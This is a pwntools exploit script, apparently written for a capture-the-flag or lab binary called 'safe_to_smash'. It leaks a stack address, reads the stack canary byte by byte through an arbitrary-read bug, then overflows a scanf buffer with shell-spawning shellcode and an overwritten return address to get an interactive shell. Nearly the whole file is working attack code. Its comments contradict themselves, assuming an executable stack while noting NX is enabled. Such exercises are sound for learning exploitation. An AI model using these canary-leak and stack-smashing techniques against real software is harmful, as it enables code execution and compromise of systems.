#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template safe_to_smash
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('safe_to_smash')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#break safe_to_smash.c:46
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# Plan:
# - take control of RIP
# - find where libc starts
# - one_gadget (github)

# Use the address leak (printf in add feature) to get the
# address of the 'f1' variable.
io = start()
leakline = io.recvline()
leakline.find(' at ')
m = re.search('at 0x([a-f0-9]+)', leakline)
f1_addr = int(m.group(1), 16)
# The canary for the frame of user_features() called by main() is
# stored 40 bytes above the address of the 'f1' variable. This
# can be seen with GDB, or by just looking at the assembly with
# objdump. Look at the 0x510 bytes reserved by main() on the stack,
# where f1 starts at main::rbp-0x510, then look at user_features() that
# copies the canary from fs:0x28 (per-thread canary) to
# user_features::rbp-0x18. Taking into account the space needed for the
# saved rip in the frame of user_features, it turns out
# that f1 is stored at user_features::rbp+16. It follows that
# rbp-0x18-(rbp+16) = -40 .
canary_addr = f1_addr + 1288
canary_addr = f1_addr - 40
print("f1@%x, canary@%x" % (f1_addr, canary_addr))

def read_byte(address):
    msg = io.recvuntil("yes/no)?\n")
    print(msg)
    io.sendline("yes")
    msg = io.recvuntil("add?\n")
    print(msg)
    # We are in user_feature().
    # Send an empty string (with some padding character just to ease
    # stack visualization when debugging), so that strlen(features)==0
    # and the malloc receives -1 as argument. It follows that 'f'
    # is set to NULL, and we can read arbitrary code exploiting the
    # leak of line 46 (f[N], and we control N).
    io.sendline('\x00' + '\xab'*100)
    msg = io.recvuntil("feature:\n")
    print(msg)
    print("reading from address N=%x N=%ld" % (address, address))
    io.sendline('%ld' % address)
    leakline = io.recvline()
    return leakline[-2]

# Use the leak to read all the 8 bytes of the canary.
canary = ''
for i in range(0, 8):
    canary += read_byte(canary_addr+i)
print("Canary is %x" % (u64(canary)))

# Now smash the stack frame of main() through scanf("%s", ans).
# The canary for main() stored at main::rbp-0x8, and the 'ans'
# buffer at main::rbp-0x110 (just looking at objdump). This
# means that there are 0x110-0x8=264 bytes between the start
# of 'ans' and the canary. Then we have the saved rbp and finally
# the saved rip that we want to overwrite.
# Assuming the stack is executable, we overwrite the saved rip
# with the address of 'ans', which is 1024 bytes ahead of 'f1'
# (0x510-0x110=1024).
msg = io.recvuntil("yes/no)?\n")
print(msg)
vector = asm(shellcraft.sh())
vector += 'cia\x00' * ((264-len(vector))/4)
vector += canary
vector += '\x00' * 8  # arbitrary value for rbp
vector += p64(f1_addr+1024)
io.sendline(vector)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

